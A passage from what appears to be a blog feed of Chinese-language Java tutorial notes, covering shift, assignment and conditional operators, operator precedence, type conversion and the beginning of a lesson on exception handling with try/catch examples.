class="token operator">>></span>3<span class="token punctuation">;</span>      //c<span class="token operator">=</span>00000000000000000000000000000000<span class="token operator">=</span>0    c <span class="token operator">=</span> a <span class="token operator">&lt;&lt;</span> 3<span class="token punctuation">;</span>    //c<span class="token operator">=</span>00000000000000000000000000111000<span class="token operator">=</span>56    c <span class="token operator">=</span> a <span class="token operator">>></span><span class="token operator">></span> 3<span class="token punctuation">;</span>   //c<span class="token operator">=</span>00000000000000000000000000000000<span class="token operator">=</span>0int a <span class="token operator">=</span>-8<span class="token punctuation">;</span> System.out.println<span class="token punctuation">(</span>a<span class="token operator">>></span><span class="token operator">></span>1<span class="token punctuation">)</span> //结果2147483644int i<span class="token operator">=</span>88<span class="token operator">>></span>32<span class="token punctuation">;</span> System.out.println<span class="token punctuation">(</span>i<span class="token punctuation">)</span>  //结果88//（在进行移位之前，java系统首先把移的位数与被移位数求余数，然后移动这个位数）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font face="Comic sans MS"><font color="red"><strong>注意：</strong></font><br>（1）右移n位后的结果与除以2的n次方效果相同<br>（2）左移n位后的结果与乘以2的n次方效果相同<br>（3）无符号右移要慎重<br></font></p><blockquote><blockquote><p>思考：  如何用一个表达式计算2的X次方？<br>答案：  1&lt;&lt;x<br>将1左移x位 </p></blockquote></blockquote><p>&emsp;<br>&emsp;</p><h4 id="1-5-赋值运算符"><font color="#3CB371" face="Comic sans MS">1.5  赋值运算符</font><a href="post/Java-Language-2-2#1-5-赋值运算符"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**(1)简单赋值运算符    = **</font> 将等号右边的表达式的值赋给等号左边的变量       例如：     int c,d;                     c=1;                     d=c+10;<font color="red">**(2)复合赋值运算符      +=、-=、*=、/=、%= 等**</font> 一般形式为：   变量 op= 表达式等价于:     变量 =变量 op 表达式c += a;     //c = c +a;c -= a;     //c = c -a;c *= a;     //c = c * a;<p>例：int a=1;<br>        double x=2;<br>        a+=2;           // 就是a=a+2, 结果使a的值为3<br>        x<em>=x+3;       // 就是x=x</em>(x+3), 结果使x的值为10.0<br>        int a=b=c=d=12;<br>        int a=(b=(c=(d=12))); //赋值运算符有返回值，返回值是=右边的值</p><p><font color="red"><strong>注意：</strong></font></p><ol><li>boolean型的只能赋给boolean型；</li><li>其他七种类型如果能自动转换则可直接赋值，否则要进行强制类型转换。<br></li></ol></font></td></tr></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="1-6-条件运算符"><font color="#3CB371" face="Comic sans MS">1.6  条件运算符</font><a href="post/Java-Language-2-2#1-6-条件运算符"></a></h4><p><font face="Comic sans MS">Java 中唯一的三元运算符，其格式如下：<br><font color="#00B2EE">&emsp;&emsp;<strong>变量 =  &lt;布尔表达式&gt; ? &lt;表达式1&gt; : &lt;表达式2&gt;</strong></font><br>含义是：当&lt;布尔表达式&gt;为真时，变量的值为&lt;表达式1&gt;的值，否则为&lt;表达式2&gt;的值。<br></font></p><pre class="line-numbers language-bash"><code class="language-bash">例:  条件运算public class max <span class="token punctuation">{</span>       public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>       <span class="token punctuation">{</span>            int x<span class="token operator">=</span>20,y<span class="token operator">=</span>30,max<span class="token punctuation">;</span>            max <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">></span>y<span class="token punctuation">)</span> ? x <span class="token keyword">:</span> y<span class="token punctuation">;</span>                  System.out.println<span class="token punctuation">(</span>“max<span class="token operator">=</span>”+max<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span>输出结果：max<span class="token operator">=</span>30练习题2:public class max <span class="token punctuation">{</span>       public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>       <span class="token punctuation">{</span>      int a<span class="token operator">=</span>3,b<span class="token operator">=</span>4,c<span class="token punctuation">;</span>      c<span class="token operator">=</span>a<span class="token operator">></span>b? ++a:b++<span class="token punctuation">;</span>      System.out.println<span class="token punctuation">(</span>a+<span class="token string">"、"</span>+b+<span class="token string">"、"</span>+c<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">}</span>输出结果：3、5、4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><hr><p>&emsp;<br>&emsp;</p><h3 id="二、-运算符的优先级"><font color="#FF6347" face="Comic sans MS">二、 运算符的优先级 </font><a href="post/Java-Language-2-2#二、-运算符的优先级"></a></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>表达式的运算次序取决于表达式中各种运算符的优先级。</strong></font><br>     （1）优先级高的先运算，优先级低的后运算。<br>     （2）括号( )的优先级最高。<br>     （3）优先级相同的情况下要考虑结合性，即从左向右运算还是从右向左运算。<br><font color="#00B2EE"><strong>Java语言规定的运算符的优先级如下表所示</strong></font><br></font></p><div class="article-img"><p><img src="https://i.loli.net/2019/01/11/5c3871997c702.png" alt="6.png" data-zoomable></p></div><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**运算符的优先级与结合性的一些规律：**</font> 1. 优先级<font color="red">       () > 单目运算符 > 双目运算符 > 三目运算符 > 赋值运算符</font> 双目： <font color="red">算术>关系>逻辑</font> 。2. 结合性<font color="red">大多数运算符结合性为从左至右赋值运算符的结合性为从右至左</font>     int a,b=3,c=5;    a = b = c;    //结果：a、b、c均为 5 <p><font color="red"><strong>表达式写法的习惯：</strong></font> </p><p>  (1) 除非是简单的直观运算，应该尽量使用括号<br>  (2)另外，尽量不要写太长的表达式，过长的表达式容易引 起对求值次序的误解。<br></p></font></td></tr></table></div></div><p></p><pre class="line-numbers language-bash"><code class="language-bash">例：    <span class="token punctuation">(</span>1<span class="token punctuation">)</span> a + b * c    <span class="token punctuation">(</span>2<span class="token punctuation">)</span> a <span class="token operator">=</span> b <span class="token operator">||</span> c    <span class="token punctuation">(</span>3<span class="token punctuation">)</span> a + b <span class="token operator">&lt;</span> c <span class="token operator">&amp;&amp;</span> d<span class="token operator">==</span>e    <span class="token punctuation">(</span>4<span class="token punctuation">)</span> a<span class="token operator">=</span>8 – 2 * 3 <span class="token operator">&lt;</span>4 <span class="token operator">&amp;&amp;</span> 5 <span class="token operator">&lt;</span> 2     结果：false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>表达式写法的习惯：</strong></font><br>  (1) 除非是简单的直观运算，应该尽量使用括号<br>  (2)另外，尽量不要写太长的表达式，过长的表达式容易引 起对求值次序的误解。<br></font> </p><hr><hr><p>&emsp;<br>&emsp;</p><h3 id="三、-数据类型转换"><font color="#FF6347" face="Comic sans MS">三、 数据类型转换  </font><a href="post/Java-Language-2-2#三、-数据类型转换"></a></h3><h4 id="3-1-自动类型转换"><font color="#3CB371" face="Comic sans MS">3.1  自动类型转换</font><a href="post/Java-Language-2-2#3-1-自动类型转换"></a></h4><p><font face="Comic sans MS">(1) Java中整型、实型、字符型数据可以混合运算。<br><font color="#00B2EE"><strong>运算过程中，Java自动把精度较低的类型转换为另一种精度较高的类型。</strong></font><br>(2) 低精度的值赋给高精度的变量可以自动转换,不出现编译错误；<font color="#00B2EE"><strong>相反会出现编译错误,需要强制转换。</strong></font><br>例如: float x=(float)5.0;long x=2;</font></p><p><font color="red"><strong>注意：</strong></font> 如果byte、short、char在一起运算时，会先将这些值转换为int型。再进行运算，结果为int型。 如表达式中一个变量是int型，另一个是long型，则先将int型转为long型，再进行计算。最后结果为long型。</p><div class="article-img"><p><img src="https://i.loli.net/2019/01/11/5c3881774735b.png" alt="7.png" data-zoomable></p></div><pre class="line-numbers language-bash"><code class="language-bash">下列代码会编译出错，提示c <span class="token operator">=</span> <span class="token punctuation">(</span>a + b<span class="token punctuation">)</span><span class="token punctuation">;</span>有精度损失class <span class="token function">test</span><span class="token punctuation">{</span>      public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>        byte a <span class="token operator">=</span> 1<span class="token punctuation">;</span>        byte b <span class="token operator">=</span> 1<span class="token punctuation">;</span>        byte c <span class="token operator">=</span> <span class="token punctuation">(</span>a + b<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><blockquote><p>练习题3:<br>下列表达式结果是什么类型？<br>‘A’+2+2.5<br>double</p></blockquote></blockquote><p>&emsp;<br>&emsp;</p><h4 id="3-2-手动强制类型转换"><font color="#3CB371" face="Comic sans MS">3.2  手动强制类型转换</font><a href="post/Java-Language-2-2#3-2-手动强制类型转换"></a></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>在Java中直接将高精度的值赋给低精度的变量会导致编译出错。这时可用强制类型转换来解决。</strong></font><br> 形式为：<br>&emsp;&emsp;<font color="red">       (类型名)表达式</font><br> 例如：<br>       int   i;   byte  b,c;<br>       b=(byte)345;      //上机测试知b得到89<br>       c=(byte)356;      //上机测试知c得到100<br>       i=(int)(3.8+6);   //强制转换后小数部分被截去，i得到9，不会四舍五入</font></p><p><font color="red"><strong>注意：</strong></font> </p><ol><li>强制类型转换可能造成信息的丢失；  </li><li>布尔型与其它基本类型之间不能转换。</li></ol><pre class="line-numbers language-bash"><code class="language-bash">加上强制类型转换，下列代码编译通过。class <span class="token function">test</span><span class="token punctuation">{</span>     public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>        byte a <span class="token operator">=</span> 1<span class="token punctuation">;</span>        byte b <span class="token operator">=</span> 1<span class="token punctuation">;</span>        byte c <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span>a + b<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**运算时注意（一般的运算都有类型提升功能）：**</font> （1）在运算过程中，运算的结果至少是int型，即如果参与运算的两个数级别比int型低或是int型，则结果为     int型；（2）参与运算的数据如果有一个级别比int型高，则运算结果的类型与类型级别高的数相同；（3）参与运算的两个数据如果类型不一样，会先把低级的数据转换成高级的类型的数据后再作运算，结果是高     级的类型。</font></td></tr></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="3-3-隐含强制类型转换"><font color="#3CB371" face="Comic sans MS">3.3  隐含强制类型转换</font><a href="post/Java-Language-2-2#3-3-隐含强制类型转换"></a></h4><p><font face="Comic sans MS">Java中允许把int类型的常量赋给byte、short变量时不需要强制类型转换<br>      byte b=123;//合法<br>      short s=123;//合法<br>      b=b+3; //不合法<br>&emsp;<br>但是把int类型的变量赋给byte、short类型的变量时必须强制转换，否则会出错<br>     int i=123;<br>     byte b=i;  //正确的做法是byte b=(byte)i;<br>    byte a = 1; byte c = (byte)(a + b);<br></font></p><blockquote><blockquote><p>练习<br>设x,y,a分别为float,double,byte型变量，x=3.3,y=2.9,a=5, 则表达式x+ (int)y/ 3*a的值为多少？值的类型是什么？ </p></blockquote></blockquote><hr><hr><p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习 </tag>
            
            <tag> Java语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-异常处理(5)</title>
      <link href="/post/Java-Exception-Handling7/"/>
      <url>/post/Java-Exception-Handling7/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br>&emsp;</p><center><font color="#3CB371" face="Comic sans MS" size="5">异常处理</font></center><p><a href="https://i.loli.net/2018/12/28/5c25dfcbaa09b.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/12/28/5c25dfcbaa09b.png" alt="程序错误.png"></a><br><a href="https://i.loli.net/2018/12/28/5c25e36859c86.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/12/28/5c25e36859c86.png" alt="程序错误1.png"></a></p><p>&emsp;</p><h3 id="一、-Java异常基础"><font color="#FF6347" face="Comic sans MS">一、 Java异常基础</font><a href="post/Java-Exception-Handling7#一、-Java异常基础"></a></h3><h4 id="1-1-为什么要引入异常处理机制？"><font color="#20B2AA" face="Comic sans MS">1.1  为什么要引入异常处理机制？</font><a href="post/Java-Exception-Handling7#1-1-为什么要引入异常处理机制？"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>程序的错误分为：</strong></font><br><strong>编译错误：</strong>程序员编写程序时语法上出现的错误；<br><strong>运行错误：</strong>程序员编写的程序在语法上没有错误，但是程序在运行时出现错误，本章就主要针对该类错误讲解 -&ensp;- 即异常、异常类和异常处理机制。</font></p><p>&emsp;</p><h4 id="1-2-以往的错误处理方法"><font color="#20B2AA" face="Comic sans MS">1.2  以往的错误处理方法</font><a href="post/Java-Exception-Handling7#1-2-以往的错误处理方法"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**主要缺陷：**&emsp;程序复杂&emsp;可靠性差&emsp;返回信息有限&emsp;返回代码标准化困难　以往的程序开发过程中，常常采用<font color="#00B2EE">**返回值**</font>进行处理。例如，在编写一个方法，可以返回一个状态代码，调用者根据状态代码判断出错与否。若状态代码表示一个错误，则调用该错误的处理程序进行相应的处理，或显示一个错误页面或错误信息。</font></td></tr></table></div></div><p><em>举例</em> <strong><em>以往的错误处理方法：采用返回值进行处理</em></strong></p><pre class="line-numbers language-java"><code class="language-java">举例：实现将一个文件从硬盘加载近来，导致加载可能失败的运行错误有硬盘错误、文件无法找到等<span class="token keyword">int</span> status<span class="token operator">=</span><span class="token function">loadTextfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">If</span> <span class="token punctuation">(</span>status<span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//something unusual happened, describe it</span> <span class="token keyword">switch</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        <span class="token comment" spellcheck="true">//file not found</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>   <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>       <span class="token comment" spellcheck="true">//disk error</span>   <span class="token keyword">default</span><span class="token operator">:</span>      <span class="token comment" spellcheck="true">//other error}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//file loaded OK, continue with program} </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="1-3-Java异常处理方法"><font color="#20B2AA" face="Comic sans MS">1.3  Java异常处理方法</font><a href="post/Java-Exception-Handling7#1-3-Java异常处理方法"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">Java异常处理方法：Java为运行错误引入了异常、异常类和异常处理机制。  **异常：**特殊的运行错误，是在程序运行过程中发生的、会打断程序正常执行的错误　例如：　除0溢出　文件找不到  数组元素下标越界　<p><strong>异常类：</strong>Java用面向对象的方法处理异常，Java的异常类是处理运行时错误的特殊类，每一种异常类对应一种<br>特定的运行错误，每一个异常事件由一个异常类的对象来代表。<br> <em>例如：除0溢出（ArithmeticException）<br>　　　文件找不到（FileNotFoundException）<br>　　　数组元素下标越界（ArrayIndexOutofBoundsException）</em></p><p><strong>异常处理机制：抛出异常——捕捉异常：</strong></p><ol><li>当出现了一些错误，方法都会产生一个<font color="red">异常对象</font>，这个异常对象将交由运行系统来处理。此过程就称为抛出<br><font color="red">(throwing)异常</font>。<strong>包括：系统抛出、用户自定义抛出。</strong></li><li>接着，运行系统开始寻找合适的处理方法，来处理这个异常。如果系统找到了一个适合的处理该异常方法，<br>这一过程就叫<font color="red">捕获异常</font>。<br></li></ol></font></td></tr></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="1-4-异常处理的语法支持"><font color="#20B2AA" face="Comic sans MS">1.4  异常处理的语法支持</font><a href="post/Java-Exception-Handling7#1-4-异常处理的语法支持"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">       **－try,catch,throws,throw,finally**(1) try包含可能出现异常的语句块；(2) 一个或多个catch块紧随try{}块，每个catch块通常处理指定类型的异常；(3) finally引导块紧随catch块后，主要用于清理现场（可有可无）。格式：try{ ......}catch( ExceptionName1 e ){ ......}catch( ExceptionName2 e ){ ......}finally{ ......}注意：finally总是执行，catch块不一定执行</font></td></tr></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="1-5-总结"><font color="#20B2AA" face="Comic sans MS">1.5  总结</font><a href="post/Java-Exception-Handling7#1-5-总结"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#EEE0E5"><font face="Comic sans MS"> (1) Java的异常处理把错误集中起来统一处理。程序员只需要说明何处可能出现异常，如何处理即可； (2) 采用面向对象的思想标准化了各种错误的类型； (3) Java把程序运行过程中可能遇到的问题分为两类，一类是致命性的，即程序遇到了非常严重的不正常状 态，不能简单地恢复执行，这就是<font color="red">**错误(对应Error类)**</font>，如程序运行过程中内存耗尽。另一类是非致命性的， 通过某种处理后程序还能继续运行，这就是<font color="red">**异常(对应Exception类)**</font>。</font></td></tr></table></div></div><p>&emsp;<br>&emsp;</p><h3 id="二、-异常类的层次"><font color="#FF6347" face="Comic sans MS">二、 异常类的层次</font><a href="post/Java-Exception-Handling7#二、-异常类的层次"></a></h3><h4 id="2-1-异常分类"><font color="#20B2AA" face="Comic sans MS">2.1  异常分类</font><a href="post/Java-Exception-Handling7#2-1-异常分类"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>☕异常类：</strong></font>异常在Java中都是作为类的实例(对象)的形式出现的。<br>&emsp;     如 Throwable类, Exception类, Error类……</font></p><p><font color="red"><strong>☕Java中异常分类：</strong></font><br> (1)  <font color="#00B2EE"><strong>Error类及其子类：</strong></font>描述Java运行时刻系统内部的错误或资源枯竭导致的错误，无法恢复和抛出，发生几率小；<br> (2)  <font color="#00B2EE"><strong>Exception类及其子类：</strong></font>普通程序可以从中恢复，分为<font color="red"><strong>运行时异常</strong></font>和<font color="red"><strong>非运行时异常</strong></font>。</p><p>&emsp;异常在Java中也是作为类的实例的形式出现的。Java中的所有的异常类都是从Throwable类派生出来的。<font color="red"><strong>Throwable类有两个直接子类：</strong></font><font color="#00B2EE"><strong>java.lang.Error</strong></font> 和 <font color="#00B2EE"><strong>java.lang.Exception</strong></font>。</p><p>异常类的层次结构如下图所示。<br><img src="https://i.loli.net/2018/12/28/5c2621a200c43.png" alt="58.png"><br><strong>(1) 🔺Error类及其子类主要用来描述一些Java运行时刻系统内部的错误或资源枯竭导致的错误。</strong>普通的程序不能从这类错误中恢复，也无法抛出这种类型的错误，这类错误出现的几率是很小的。<br><strong>(2) 🔺另一个异常类的子类是Exception类和它的子类。</strong>在编程中错误的处理主要是对这类错误的处理，如除数为零、数组下标越界等。类Exception是普通程序可以从中恢复的所有规范了的异常的父类。<br></p><p>&emsp;<br>&emsp;</p><h4 id="2-2-Exception类的子类"><font color="#20B2AA" face="Comic sans MS">2.2  Exception类的子类</font><a href="post/Java-Exception-Handling7#2-2-Exception类的子类"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>☕Exception类子类有两种：</strong></font><br><strong>运行时异常</strong>和<strong>非运行时异常（一般异常）</strong>　&emsp;&emsp;&emsp;　<em>区别？？？</em><br><font color="#00B2EE"><strong>（1）运行时异常：</strong></font>RuntimeException类及其所有子类。      运行时异常是程序员编写程序不正确所导致的异常，理论上，程序员经过检查和测试可以查出这类错误。如<strong>除数为零等，错误的强制类型转换、数组越界访问、空引用</strong>。<br><font color="#00B2EE"><strong>（2）非运行时异常（一般异常）：</strong></font>指可以由编译器在编译时检测到的、可能会发生在方法执行过程中的异常，如找不到指定的文件等，这不是程序本身的错误，如果这些异常情况没有发生，程序本身仍然是完好的。　　<br><font color="red"><strong>注意：</strong></font><strong>编译器强制要求Java程序必须</strong><font color="#00B2EE"><strong>捕获</strong></font><strong>或</strong><font color="#00B2EE"><strong>声明抛出</strong></font><strong>所有非运行时异常，但对运行时异常不作要求。运行时异常编译可以通过但是运行时出现异常；非运行时异常编译的时候就通不过。</strong></font></p><p><em>例如：格式不正确的URL、试图为一个不存在的类找到一个代表它的类的对象。除了runtimeexception及其子类以外，其他exception类的子类都是非运行时异常。</em><br></p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//运行时异常和非运行时异常区别举例  </span><span class="token punctuation">[</span>例<span class="token number">5</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> RuntimeExceptionDemo1<span class="token punctuation">.</span>java<span class="token keyword">class</span> <span class="token class-name">RuntimeExceptionDemo1</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>该程序能编译通过，而在运行时，出现如下提示：<span class="token operator">></span> javac RuntimeExceptionDemo1<span class="token punctuation">.</span>java<span class="token operator">></span> java RuntimeExceptionDemo1Exception in thread <span class="token string">"main"</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ArithmeticException<span class="token operator">:</span> <span class="token operator">/</span> by zero at RuntimeExceptionDemo1<span class="token punctuation">.</span><span class="token function">main</span><span class="token punctuation">(</span>RuntimeExceptionDemo1<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//这里的"ArithmeticException"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">[</span>例<span class="token number">5</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> NonRuntimeExceptionDemo1<span class="token punctuation">.</span>java<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">NonRuntimeExceptionDemo1</span><span class="token punctuation">{</span>       <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       FileInputStream in<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"text.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> s<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token operator">=</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span>会出现如下的错误提示：javac NonRuntimeExceptionDemo1<span class="token punctuation">.</span>javaNonRuntimeExceptionDemo1<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">5</span><span class="token operator">:</span> unreported exception java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileNotFoundException<span class="token punctuation">;</span> must be caught or declared to be thrownFileInputStream in<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"text.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token operator">^</span>NonRuntimeExceptionDemo1<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">7</span><span class="token operator">:</span> unreported exception java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span> mustbe caught or declared to be thrown<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token operator">=</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token operator">^</span>NonRuntimeExceptionDemo1<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span> unreported exception java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span> mustbe caught or declared to be thrownin<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>☕对运行时异常的说明：</strong></font>由于运行时异常可能会出现在程序的任何地方，而且出现的可能性非常大，因而由程序本身去检测运行异常出现与否，将会使程序的开销过大，所以<br>运行时异常是由Java运行时系统在程序的运行过程中检测到的,它可能在程序中任意部位发生,而且其数目可能很大,因此Java编译器允许程序不对它进行处理。这时，java运行时系统会把生成的运行时异常对象交给默认的异常处理，在标准输出设备上显示异常的内容以及发生异常的位置<br><font color="#00B2EE"><strong>建议对于运行时异常用户不要去捕获，捕获就是承认这个错误，但是一般我们编程的希望是发生错误能改正就尽量改正，除非不是由程序员自己意愿决定的错误。</strong></font><br>&emsp;<br><font color="red"><br><strong>☕对运行时异常和非运行时异常的总结：</strong></font><br>(1) 当出现java.lang.ArithmeticException运行时异常时，不需要用户在程序中对其进行处理，而直接由Java运行时系统进行处理；<br>(2) 对于非运行时异常，Java编译器对程序进行编译的时候，便指出用户需要<font color="#00B2EE">①捕获该类异常</font>或者<font color="#00B2EE">②声明抛出</font>。即对于非运行时异常，用户需要在程序中进行处理，否则编译时无法通过。<br></font></p><pre class="line-numbers language-java"><code class="language-java">① 捕获该类异常<span class="token punctuation">[</span>例<span class="token number">5</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> NonRuntimeExceptionDemo1<span class="token punctuation">.</span>java<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">NonRuntimeExceptionDemo1</span><span class="token punctuation">{</span>       <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>             FileInputStream in<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"text.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> s<span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token operator">=</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>           in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              